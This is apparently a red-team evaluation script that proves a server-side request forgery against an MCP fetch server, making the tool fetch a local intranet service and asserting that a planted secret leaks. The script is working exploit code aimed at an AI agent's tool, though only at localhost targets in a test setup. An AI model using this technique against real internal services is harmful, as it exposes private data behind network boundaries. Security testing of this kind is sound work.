"""Deterministic SSRF exploit proof against the real fetch server.

PASS when fetch("http://127.0.0.1:9211/") returns the intranet victim's secret
that only server-side code should be able to reach — the official
mcp-server-fetch has no private-IP guard (its README warns it "can access
local/internal IP addresses and may represent a security risk").

The victim service is spawned together with the target (see _fresh.py); this
script expects it already running on 127.0.0.1:9211 (or --url override).

Usage:
    python eval/fetch_ssrf/prove.py [--url http://127.0.0.1:9210/sse]
"""

from __future__ import annotations

import argparse
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from mcp_redteam.targets.mcp_client import McpSession

DEFAULT_URL = "http://127.0.0.1:9210/sse"
INTRANET = "http://127.0.0.1:9211/"
SECRET = "TOP-SECRET-INTRANET-2026"


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_URL)
    args = parser.parse_args()

    async with McpSession(args.url) as s:
        tools = await s.raw_list_tools()
        names = [t.name for t in tools]
        assert "fetch" in names, f"expected a 'fetch' tool, got {names}"
        r = await s.call_tool("fetch", {"url": INTRANET})
        assert SECRET in r.result_text, f"intranet secret not leaked: {r.result_text!r}"
        assert "Welcome to nginx!" in r.result_text, r.result_text
        print(f"PASS: fetch({INTRANET!r}) returned intranet-only content:")
        print("     " + r.result_text.replace("\n", "\n     "))


if __name__ == "__main__":
    asyncio.run(main())
